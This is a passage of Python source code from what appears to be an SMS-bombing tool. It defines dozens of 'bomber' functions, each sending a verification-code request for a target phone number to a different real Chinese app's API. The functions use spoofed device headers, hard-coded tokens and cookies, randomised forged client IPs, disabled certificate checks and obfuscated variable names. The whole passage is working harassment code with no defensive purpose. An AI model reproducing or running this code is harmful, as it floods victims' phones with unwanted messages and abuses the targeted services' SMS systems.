    headers = {'Cookie': 't=1781594954460; cityIpLocation=112.47.135.153; clt=1781594954; cld=20260616152914; reqtype=pc; gidinf=x099980109ee1caeb22595035000f2d9a20da93a19e8; _dfp=R+Dux0DFbysvyhDjJV70lmniV1V14NBQp1ZmN2cWHcQ=; IPLOC=CN; SUV=260616152914J07B; hideAddDesktop=true', 'Referer': 'https://www.sohu.com/', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 QQBrowser/21.1.8717.400'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_app_duomeiziran_com(phone):
    'duomeiziran.com 发送验证码'
    url = 'https://app.duomeiziran.com/mag/user/v1/user/registerPhoneCode'
    payload = {'phone': phone, 'country_code': '86'}
    headers = {'pt': '1', 'mag-version': 'Android-6.7.0-1.0.0-28', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 MAGAPPX|6.7.0-1.0.0-28|Android 16 OnePlus PJE110|dmzr|aieAvv468WoDAKCxgfPUwrpW|c4726a9437db4034638c75861e652637|1ca2eb9ea305fe54681e1484f0f54942'}
    requests.post(url, data=payload, headers=headers, timeout=10, verify=False)

def bomber_merch_airacloud_com(phone):
    'airacloud.com 发送验证码'
    import uuid
    import random
    url = 'https://merch.airacloud.com/api/merchant/auth/send-sms-code'
    tw3u_IANfKN8RaIrkV15d0F6iD8f9oSbqQrg1RgfgPeh3 = (uuid.uuid4().hex + uuid.uuid4().hex[:32])
    jONCwQugK0K0OUoj7RklvYFL3dbtb9rmFlkBwLA8IIwrAOX7x8xne7o9U = ['10', '11', '12', '13', '14']
    gFfT6kIpuLF0NoRi91miXrfHSl6bRm4NAAx0IkPaaT0i2iNd6 = ['SM-G9910', 'MI 11', 'Pixel 6', 'OnePlus 9', 'Xiaomi 12']
    h_0h44sQUGiCWoEd58kgB5zaFbTvL7V1LES4vUxyWJR = ''.join(['okhttp/4.12.0 (Android ', str(random.choice(jONCwQugK0K0OUoj7RklvYFL3dbtb9rmFlkBwLA8IIwrAOX7x8xne7o9U)), '; ', str(random.choice(gFfT6kIpuLF0NoRi91miXrfHSl6bRm4NAAx0IkPaaT0i2iNd6)), ')'])
    Qv4WbtfcC2xS1MpbP6zFeN5G29Pens7cKdiFpvKZo = ['183.14.132.117', '120.85.121.45', '223.104.67.89', '117.136.79.123']
    random_ip = random.choice(Qv4WbtfcC2xS1MpbP6zFeN5G29Pens7cKdiFpvKZo)
    headers = {'X-Originating-IP': random_ip, 'X-Real-IP': random_ip, 'X-Forwarded-For': random_ip, 'User-Agent': h_0h44sQUGiCWoEd58kgB5zaFbTvL7V1LES4vUxyWJR, 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'merch.airacloud.com', 'Content-Type': 'application/json', 'Aira-Language': 'zh-CN', 'client-Id': '1937', 'tenant-Id': '100', 'Aira-Version': '4.7.0', 'Aira-Cuid': tw3u_IANfKN8RaIrkV15d0F6iD8f9oSbqQrg1RgfgPeh3}
    payload = {'scene': 1, 'mobile': phone}
    requests.post(url, headers=headers, json=payload, timeout=10, verify=(1 == 0))

def bomber_api_cyol_com(phone):
    'cyol.com 发送验证码'
    url = 'https://api.cyol.com/user/verifyCode'
    payload = {'verType': '6', 'mobile': phone}
    headers = {'User-Agent': 'okhttp/3.12.12', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.cyol.com', 'Content-Type': 'application/json; charset=UTF-8', 'cyol-ua': 'Dalvik/2.1.0 (Linux; U; Android 14; iPA2375 Build/UP1A.231005.007)CYOLAPP Android Version5002050020', 'cyol-channel': 'vivo', 'cyol-system': '14', 'cyol-version': '5.0.2', 'cyol-uuid': 'Android-79db1e6b-2d87-4600-8f8b-97ac657fefc1', 'cyol-resolution': '1968*2800', 'cyol-client-type': '04', 'cyol-package-name': 'com.hzpd.zqzx', 'cyol-network': '1'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_jf_api_81_cn(phone):
    url = 'https://jf-api.81.cn/api/mobile/getMobileCode'
    payload = {'platform': 'android', 'uniqueId': 'YrFkn7ch9C_', 'userId': '', 'deviceId': 'YrFkn7ch9C', 'app_id': 'CBF', 'mobile': phone, 'appId': 'CBF', 'os': 'Android', 'app_version': '3.2.3', 'unique_id': 'YrFkn7ch9C_', 'appVersion': '3.2.3'}
    headers = {'User-Agent': 'okhttp/3.8.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'jf-api.81.cn', 'Content-Type': 'application/json; charset=utf-8', 'userId': '', 'appId': 'CBF', 'os': 'Android', 'appVersion': '3.2.3', 'uniqueId': 'YrFkn7ch9C_', 'deviceId': 'YrFkn7ch9C', 'token': ''}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_yjnt111_top(phone):
    'yjnt111.top 发送验证码'
    url = 'https://api.yjnt111.top/api/member/sendSms'
    payload = {'phone': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.yjnt111.top', 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36 (Immersed/28.0) Html5Plus/1.0', 'X-Requested-With': 'XMLHttpRequest'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_beawan_com(phone):
    url = 'https://api.beawan.com/company/user/sendCode'
    payload2 = {'phoneNumber': phone}
    headers = {'User-Agent': 'okhttp/4.9.2', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.beawan.com', 'accept': 'application/json, text/plain, */*'}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_api_iyb983_cn(phone):
    url = 'https://api.iyb983.cn/peony/v1/vcode'
    payload2 = {'type': '6', 'tel': phone}
    S2PYq90XQaNwuA5cBn_xE1aHoXKdboFPW8V13L84GOp7wk759AhZIU = str(int((time.time() * 1000)))
    headers = {'User-Agent': 'okhttp/4.10.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api.iyb983.cn', 'X-Version': '14', 'X-Device-Model': 'iPA2375', 'X-Brand': 'vivo', 'X-Platform': 'Android', 'X-Request-Id': 'e4c7ba06-b2d5-4abb-b100-56c45ab644d3', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBpZCI6MSwiZGV2aWNlX2lkIjoiZTRjN2JhMDYtYjJkNS00YWJiLWIxMDAtNTZjNDVhYjY0NGQzIiwiZXhwIjoxNzg5NDQxNTQwLCJpYXQiOjE3ODE2NjU1NDAsImlzcyI6IjlwNnlqdW9hVnhuMFZ3d21TdHRJY20zWEp3bWNmUkNrIiwianRpIjoianZKVEdGbHRCaiIsImxvZ2luX3RpbWUiOjE3ODE2NjU1NDAsIm1wX3VpZCI6IiIsIm5iZiI6MTc4MTY2NTU0MCwicGxhdGZvcm0iOiJtb2JpbGUiLCJzaXRlIjo0LCJzdWIiOiJhbm9ueW1vdXMiLCJ1aWQiOiJhbm9ueW1vdXMifQ.IueyjzgTZK15LQwJ66N6_cSdOm5H1JXyBGYD7qpCdDM', 'X-Timestamp': S2PYq90XQaNwuA5cBn_xE1aHoXKdboFPW8V13L84GOp7wk759AhZIU}
    requests.get(url, params=payload2, headers=headers, timeout=10, verify=False)

def bomber_www_zucaijia_com(phone):
    url = 'https://www.zucaijia.com/api/auth/send_code'
    payload = {'network_class': 'wifi', 'timezone_name': 'CST', 'timezone_offset': '+08:00', 'region': 'CN', 'locale': 'zh_CN', 'screen_resolution_px': '1968x2800', 'android_api_level': '34', 'os_version': '14', 'os_name': 'android', 'device_model': 'iPA2375', 'device_brand': 'vivo', 'device_id': '3sRuMSkrorhZAPmq', 'channel': 'vivo', 'version': '2.5.2.12', 'phone': phone}
    headers = {'content-type': 'application/json; charset=utf-8', 'x-device-id': '3sRuMSkrorhZAPmq', 'host': 'www.zucaijia.com', 'accept-encoding': 'gzip', 'x-channel': 'vivo', 'x-version': '2.5.2.12', 'user-agent': 'Dart/3.5 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_feapi_feheadline_com(phone):
    url = 'https://feapi.feheadline.com/provider/api/v1/fe-judgment-captcha'
    data = {'client_time': str(int((time.time() * 1000))), 'app_channel': 'vivo', 'app_versioncode': '30510', 'app_versionname': '3.5.10', 'app_plantform': 'android', 'access_token': 'bc2ed55779d482d4dbfdae48a6c9f81e', 'user_token': 'ccb5e810713526fbae7fa068c4513617', 'user_id': '0', 'code': '0', 'phone': phone, 'type': 'VERIFICATION'}
    headers = {'User-Agent': 'okhttp/4.9.1', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'feapi.feheadline.com', 'Content-Type': 'application/x-www-form-urlencoded'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_ring_api_jsddx_cn(phone):
    'jsddx.cn 发送验证码'
    url = 'https://ring-api.jsddx.cn/login/sendVerifyCode'
    payload = {'appClient': '100009', 'token': 'dfNsJVuNC06dyhGo+uQeH2OJDfISBb95mc+JoORCht5SZGj9YzGVES9drVFVhe2bEDOd+B26hvTrFZMl1lBrbUOHZLIXzvOZjpzd8Nag4gzzZ34QzyQoYOuMwC7YVi2Ytc4IrpnAlE6dSbEuru3cig==', 'projectId': '55', 'version': '4.6.5', 'model': 'iPA2375', 'channel': '002', 'mobile': phone}
    headers = {'User-Agent': 'okhttp/4.12.0', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'ring-api.jsddx.cn', 'Content-Type': 'application/json;charset=utf-8', 'Cache-Control': 'max-age=10'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_api_game_zubajiezuhao_com(phone):
    'zubajiezuhao.com 发送验证码'
    url = 'https://api-game.zubajiezuhao.com/api/account/sendVCode'
    data = {'type': '0', 'phone': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api-game.zubajiezuhao.com', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36', 'vendorSystemVersion': 'Funtouch 14.0', 'systemVersion': '14', 'lebianVersionCode': '30', 'model': 'iPA2375', 'packageName': 'com.duodian.zubajie', 'androidId': '57d1015e83650e4e', 'deviceBrand': 'vivo', 'X-channel': 'bajievivo', 'screenWidth': '1968', 'X-versionNumber': '30', 'X-versionCode': '1.2.6', 'deviceToken': 'CFAB151008B46A960D39319377B5B60370CBD67D', 'deviceId': 'f48c3f2b3c054aab8739efcad68b3814', 'token': 'F+nFFZSjs28m7/JrEEH3nYm9VDsuqINOtNBcMJu7znrKMmskz+sCXJ6DJRjK1ncmBZV/leswzrx2HRUSArNw+A=='}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_api_octinn_com(phone):
    'octinn.com 发送验证码'
    url = 'https://api.octinn.com/account/send_verify_code'
    payload = {'ticket': '', 'authCode': '', 'type': 5, 'countryCode': '86', 'phone': phone}
    headers = {'OI-CHN': '2108', 'OI-APIVER': '61', 'OI-AUTH': '', 'OI-APPKEY': '20fb59e10b0d0b9823fb2a6c715f3ce6', 'material': '', 'OI-UDID': '89e6dc565402a3ec5f5eb6ba1327ed77', 'Accept-Encoding': 'gzip', 'User-Agent': 'BRA 9.82.3 (chn/2108 material/null)', 'Connection': 'Keep-Alive', 'Host': 'api.octinn.com', 'Content-Type': 'application/json; charset=UTF-8'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_apigame_zubajiezuhao_com(phone):
    'zubajiezuhao.com 发送验证码'
    url = 'https://api-game.zubajiezuhao.com/api/account/sendVCode'
    data = {'type': '0', 'phone': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'Host': 'api-game.zubajiezuhao.com', 'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Linux; Android 14; iPA2375 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Safari/537.36', 'vendorSystemVersion': 'Funtouch 14.0', 'systemVersion': '14', 'lebianVersionCode': '109', 'model': 'iPA2375', 'packageName': 'com.ddxf.c.zhwan', 'androidId': '194743744d21167c', 'deviceBrand': 'vivo', 'X-channel': 'zuhaowangvivo', 'screenWidth': '1968', 'X-versionNumber': '107', 'X-versionCode': '1.0.7', 'deviceToken': 'CAFD7C069CE47EE4B3E3BB14FE365902125099FE', 'deviceId': 'aa1b737986b14483aebcac158ba7e04e', 'token': 'F+nFFZSjs28m7/JrEEH3nYmzTHOFKePYr44XwISoQqxsHtgvR/gY0P2zLTLsfetD7DJcxTvL/j0qnxvEmKhiFQ=='}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_apiv2_somuseai_com(phone):
    'somuseai.com 发送验证码'
    url = 'https://apiv2.somuseai.com/app_login/get_verifycode'
    payload = {'phone_code': '86', 'phone_num': phone}
    headers = {'g-token': '', 'content-type': 'application/json; charset=utf-8', 'accept-language': 'zh-CN', 'ua': json.dumps({'android_id': 'd9d341f78286d9d1', 'version_code': '205', 'ad_track': {'app_version': '1.8.4', 'platform': 'oppo', 'channel': 'oppo'}, 'oaid': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'platform': 'oppo', 'device-os': 'Android', 'brand': 'OnePlus', 'app-version': '1.8.4'}, separators=(',', ':')), 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.10 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_m_epiaom_com(phone):
    'epiaom.com 发送验证码'
    url = 'https://m.epiaom.com/project2/web/'
    payload2 = {'r': '/portal/User-getVcode'}
    data = {'on': 'login', 'phone': phone, 'type': 'sms'}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.10.0'}
    requests.post(url, params=payload2, data=data, headers=headers, timeout=10, verify=False)

def bomber_www_zhunanda_com(phone):
    'zhunanda.com 发送验证码'
    url = 'http://www.zhunanda.com/app/modules/user/send_login_code'
    payload = {'phone': phone}
    headers = {'Authorization': '', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app Html5Plus/1.0 (Immersed/40.0)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_ai_antusheng_com(phone):
    url = 'https://api.ai-antusheng.com/api/auth/verification-code'
    payload = {'purpose': 'register', 'phone': phone, 'accountType': 'phone'}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.9.2'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_h_zywj_top(phone):
    url = 'https://h.zywj.top/api/zhongyun.auth/sendSmsCode'
    data = {'mobile': phone}
    headers = {'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_ai_doc_api_gwxzl_com(phone):
    'gwxzl.com 发送验证码'
    url = 'https://ai-doc-api.gwxzl.com/api/auth/smscode'
    payload = {'deviceId': '0f25ce12ec19eb22', 'codeType': '1', 'phone': phone}
    headers = {'Content-Type': 'application/json;charset=UTF-8', 'Accept-Language': 'zh-CN', 'X-Device-Features': 'touch,high-dpi,notch,dark-mode,biometric,nfc,bluetooth,camera,gyroscope', 'X-Network-Type': 'WIFI', 'X-Timezone': 'Asia/Shanghai', 'X-Platform': 'Android', 'X-App-Version': '203', 'X-Client-Version': '203', 'X-Client-Type': 'ANDROID_APP', 'X-Client-Channel': 'official', 'X-Client-Code': 'gongwenzhushou', 'X-Device-Id': '0f25ce12ec19eb22', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 16; PJE110 Build/TP1A.220905.001)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_yjsgai_yijiushuoguo_com(phone):
    'yijiushuoguo.com 发送验证码'
    url = 'https://yjsgai.yijiushuoguo.com/shuoguo-user-service/api/app/auth/sms/send'
    payload = {'scene': 'LOGIN_REGISTER', 'phone': phone}
    headers = {'X-Request-Id': '395c6fdc-c6da-450f-b097-5e8a9f8336f7', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 uni-app (Immersed/40.0) Html5Plus/1.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_ruanxx_com(phone):
    url = 'https://www.ruanxx.com:18080/app-api/system/auth/send-sms-code'
    payload = {'mobile': phone}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'ai_secretary/Android', 'Host': 'www.ruanxx.com:18080'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_www_codebanana_com_cn(phone):
    'codebanana.com.cn 发送验证码'
    url = 'https://www.codebanana.com.cn/api/auth/sms/send-code'
    payload = {'phone': phone}
    headers = {'commondealresp': 'false', 'x-tic-lang': 'zh', 'toasterror': 'false', 'checktoken': 'false', 'accept-language': 'en', 'timezone': 'Asia/Shanghai', 'x-tic-client-info': 'Android-16-OnePlus-PJE110', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_client_qzhuli_com(phone):
    'qzhuli.com 发送验证码'
    url = 'https://client.qzhuli.com/user/get_unified_captcha'
    payload = {'uid': '', 'r': '1781417698407', 'platform': 'Android', 'phone': phone, 'key': '6a8157754671050cddbcd745ce4f2fc4', 'base': {'device_id': 'd1260f30da95092fdf8e403c7a639af7', 'first_startup_time': '1781417689', 'first_install_time': '1781206105', 'mac': '74db0e879f338a74eac1738ff6cf5223', 'android_id': '67604133bed8dd5c85c4ddbfa10e1dc4', 'o_aid_info': '', 'device_info': 'PJE110_OnePlus_36_ver_52000', 'device_token': '', 'channel': 'oppo', 'v': 52000, 'platform': 'android'}, 'admin_uid': ''}
    headers = {'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/5.3.2'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_m_wanwenai_com(phone):
    'wanwenai.com 发送验证码'
    url = 'https://m.wanwenai.com/api/auth/send-sms'
    payload = {'purpose': 'login', 'phone': phone}
    headers = {'x-client': 'android', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_nolaengine_chataimee_com(phone):
    'chataimee.com 发送验证码'
    url = 'https://nolaengine.chataimee.com/nola/sms'
    payload = {'phone': phone}
    headers = {'platform': 'android', 'os_version': '16', 'app_name': 'Aimee', 'client_id': 'c4c4a5f5-1b38-4db8-ba9d-6de52728edff', 'version': '1.0.0', 'session_id': '8049465f-9f36-4369-9337-74afd221a3dc', 'app_version_code': '26', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'User-Agent': 'Dart/3.11 (dart:io)'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_phanthy_com(phone):
    'phanthy.com 发送验证码'
    url = 'https://phanthy.com/api/auth/phone/send-code'
    payload = {'purpose': 'LOGIN', 'phone': ''.join(['+86', str(phone)])}
    headers = {'Cookie': 'preferred-language=zh; preferred-language-mode=system; moe_agi_anonymous_id=anon_1781418759133_9jreywbfs; Hm_lvt_adf241a0685a8c60c2734674a326582c=1781418759; Hm_lpvt_adf241a0685a8c60c2734674a326582c=1781418759; HMACCOUNT=98BF1B0F34319B8D; moe_agi_session_id=%7B%22sessionId%22%3A%22sess_1781418759133_a848mrl2f%22%2C%22lastActivity%22%3A1781418759838%7D', 'accept-language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'referer': 'https://phanthy.com/chat', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'x-requested-with': 'com.phanthy.app', 'origin': 'https://phanthy.com', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"', 'sec-ch-ua-platform': '"Android"', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip, deflate, br, zstd', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_youyouai_enactflow_com(phone):
    'enactflow.com 发送验证码'
    url = 'https://youyouai.enactflow.com/api/auth/send-phone-code'
    payload = {'phone': ''.join(['+86', str(phone)])}
    headers = {'Content-Type': 'application/json; charset=UTF-8', 'X-Platform': 'ANDROID', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/4.12.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_cn_xxzz123_top(phone):
    'xxzz123.top 发送验证码'
    url = 'https://api-cn.xxzz123.top/api/honeytalk/user/sendSms'
    payload2 = {'mobile': phone}
    headers = {'content-length': '0', 'upgrade-ascribe-encoding': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'authorization': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3ODE0MTkzMzMsIm5iZiI6MTc4MTQxOTMzMywiZXhwIjoyMDk2Nzc5MzMzLCJkYXRhIjp7InVzZXJJZCI6MTQ4NywibW9iaWxlIjpudWxsLCJ1bmlvbmlkIjpudWxsLCJlbmNvZGluZyI6IkYxQjRFM0Y5ODI1QTRBNERCNDY4RUJGMUNBMEZENkMzOGQxNjdhZmZkNjNjMzJhYmZhNTg3NjZjYjUwMTcxNTcifX0.gKH3bTv5TC6EOaw_hAEs6fFzZkVwg1fvbi49bi_tqiA', 'xx-project': 'honeytalk', 'upgrade-ascribe-id': '90921187b7c2af2b', 'xx-package-name': 'com.my.input', 'xx-lang': 'cn', 'xx-api-version': '1.0.1', 'xx-api-channel': 'oppo', 'xx-device-type': 'OnePlus_PJE110', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.11.0'}
    requests.post(url, params=payload2, headers=headers, timeout=10, verify=(1 == 0))

def bomber_loverkeyboard_com(phone):
    'loverkeyboard.com 发送验证码'
    url = 'https://loverkeyboard.com/api/sms/send'
    data = {'event': 'mobilelogin', 'mobile': phone}
    headers = {'Cache-Control': 'no-cache', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'SMT Android Client/1.0'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_poetryzz_com(phone):
    'poetryzz.com 发送验证码'
    url = 'https://poetryzz.com/api/auth/sms/send'
    payload = {'uniqueIdentifier': 'F1B4E3F9825A4A4DB468EBF1CA0FD6C38d167affd63c32abfa58766cb5017157', 'phone': phone}
    headers = {'Content-Type': 'application/json; charset=UTF-8', 'Version-Code': '2.5.0', 'Channel-Code': '1003', 'X-Nonce': '659907917d7547d9bbc7f53b48a289e5', 'Product-Code': '1000', 'X-Signature': 'wRRtYgxooWb9VURuCtMiDAfNk4/BBJ6qWlJkkonsjkY=', 'X-Timestamp': str(int((time.time() * 1000))), 'X-App-Key': 'test_app_key', 'Accept-Encoding': 'gzip', 'Connection': 'Keep-Alive', 'User-Agent': 'okhttp/3.11.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_cn01_tange365_com(phone):
    url = 'https://api-cn01.tange365.com/app/user/captcha/send'
    payload = {'version_no': '31489', 'version': '3.61.4', 'username': phone, 'scene': 'REGISTER', 'platform': 'android', 'pkgname': 'com.tange365.icam365', 'language': 'zh-cn', 'country_code': 'CN', 'area_code': '86', 'appstore': 'default', 'appid': '5920020', 'app_version_no': '31489', 'X-Tg-Sdk-Version': '22098', 'X-Tg-App-Sdk-Version': '22098'}
    headers = {'content-type': 'application/json; charset=UTF-8', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.10.0'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=False)

def bomber_metaso_cn(phone):
    url = 'https://metaso.cn/verify'
    payload2 = {'type': 'signup'}
    payload = {'phone': ''.join(['86-', str(phone)])}
    headers = {'Cookie': 'sid=d20e563c69ee46abb14640547bc283ef; aliyungf_tc=fed188a574ba4628f04df62d066a007d740f31b34c611eb3bafad186bcb9d2bd; traceid=5a67a56e4dc94eaf', 'Content-Type': 'application/json; charset=UTF-8', 'X-Request-ID': '4546c92f-8f76-4cc8-8a73-df32681be721', 'device-name': 'OnePlus_PJE110', 'device-os-version': '16', 'tid': '764fb85063fcb29a', 'Cache-Control': 'no-cache', 'Pragma': 'no-cache', 'metaso': 'android;276;2.7.6', 'metaso-app': 'android;276;2.7.6', 'Accept-Encoding': 'gzip', 'Accept': 'application/json, text/plain, text/event-stream, */*; charset=utf-8', 'Connection': 'Keep-Alive', 'User-Agent': 'metaso/276 android'}
    requests.post(url, params=payload2, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_bds_api_cn_baseus_cn(phone):
    'baseus.cn 发送验证码'
    url = 'https://bds-api-cn.baseus.cn/app/account/sendSms'
    data = {'type': '2', 'mobile': phone}
    headers = {'cache-control': 'no-cache', 'env': 'CN', 'channel': 'oppo', 'versioncode': '172', 'appversion': '2.13.1', 'lang': 'zh_CN', 'model': 'PJE110', 'brand': 'OnePlus', 'osversion': '16', 'auth': '', 'platform': '1', 'Accept-Encoding': 'gzip', 'User-Agent': 'okhttp/4.11.0'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=(1 == 0))

def bomber_api_game_duodian_cn(phone):
    'duodian.cn 发送验证码'
    url = 'https://api-game.duodian.cn/api/account/sendVCode'
    data = {'type': '0', 'phone': phone}
    headers = {'vendorsystemversion': 'unknown', 'buildpacktime': '2026-06-02 19:08:11', 'x-apptype': '0', 'source': 'android', 'lebianversioncode': '1780398491', 'mainversion': '3.0.6', 'systemversion': '16', 'model': 'PJE110', 'packagename': 'com.duodian.freehire', 'androidid': '5dc50c268766b0b6', 'devicebrand': 'OnePlus', 'x-channel': 'freeoppo', 'screenwidth': '1080', 'x-versionnumber': '349', 'x-versioncode': '3.3.4', 'devicetoken': '1D3B4F41B58F48B276D7B66211680A0EA75CEBC3', 'deviceid': '9f6748d0a1f1456cbbf0f3ff4c0a7c0f', 'token': 'mO6wMb6+aAoXqM6EP7XuzWlCl/9Bb2L6TyNPaFul8oLyooEM11nl/YO0P2GtE9d/0cc/9yjyF18mc7pncw9dQA==', 'Accept-Encoding': 'gzip', 'User-Agent': 'Mozilla/5.0 (Linux; Android 16; PJE110 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36'}
    requests.post(url, data=data, headers=headers, timeout=10, verify=False)

def bomber_api_3acg_3ayx_net(phone):
    '3ayx.net 发送验证码'
    url = 'https://api-3acg.3ayx.net/3agame/resource_manage/send_sms_code'
    payload = {'business_type': 1, 'area_code': '86', 'phone': phone}
    headers = {'client_new_flag': 'newFlag', 'platform': 'android', 'timestamp': str(int((time.time() * 1000))), 'channel': 'oppo', 'route': '/login', 'version': '2.7.19-1604', 'Content-Type': 'application/json', 'Accept-Encoding': 'gzip', 'Accept': 'application/json,*/*', 'User-Agent': 'CloudGame/2.7.19-1604 (Android 16; PJE110; OnePlus; [arm64-v8a, armeabi-v7a, armeabi])'}
    requests.post(url, json=payload, headers=headers, timeout=10, verify=(1 == 0))

def bomber_niuxiaoer_net(phone):
    'niuxiaoer.net 发送验证码'
    url = 'https://niuxiaoer.net/service/recruit/sms/captcha'
    payload = {'mobile': phone}
